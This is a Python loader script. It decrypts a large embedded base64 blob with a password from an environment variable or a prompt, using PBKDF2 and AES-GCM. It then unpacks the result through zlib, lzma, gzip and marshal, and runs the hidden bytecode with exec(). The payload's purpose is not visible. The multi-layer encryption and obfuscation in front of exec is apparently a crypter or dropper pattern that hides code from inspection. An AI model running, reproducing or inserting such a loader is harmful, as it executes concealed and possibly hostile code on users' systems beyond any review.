
import os, base64, zlib, gzip, lzma, getpass, marshal, hashlib, sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

PBKDF2_ITERS = 300000
SALT_LEN = 32
KEY_LEN = 32

def derive_key_from_pass(passphrase: str, salt: bytes) -> bytes:
    return PBKDF2(passphrase.encode("utf-8"), salt, dkLen=KEY_LEN, count=PBKDF2_ITERS)

def multi_decompress(data: bytes):
    lzmaed = zlib.decompress(data)
    gzipped = lzma.decompress(lzmaed)
    marshaled = gzip.decompress(gzipped)
    code = marshal.loads(marshaled)
    return code

def coophalco():
    try:
        b64_data = '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'
        payload = base64.b64decode(b64_data)
        
        pos = 0
        integrity_hash = payload[pos:pos+16]
        pos += 16
        
        salt = payload[pos:pos+SALT_LEN]
        pos += SALT_LEN
        
        nonce = payload[pos:pos+16]
        pos += 16
        
        tag = payload[pos:pos+16]
        pos += 16
        
        ciphertext = payload[pos:]
        
        pw = os.getenv("SCRIPT_KEY")
        if not pw:
            pw = getpass.getpass("Enter password: ")
        
        if hashlib.sha256(pw.encode()).digest()[:16] != integrity_hash:
            print("Error: Invalid password")
            sys.exit(1)
        
        key = derive_key_from_pass(pw, salt)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        
        try:
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        except ValueError as e:
            print("Error: Wrong Password")
            print("This usually means wrong password or corrupted data")
            sys.exit(1)

        code = multi_decompress(decrypted)
        exec(code, globals())
        
    except Exception as e:
        print(f"Error: {type(e).__name__}: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    coophalco()
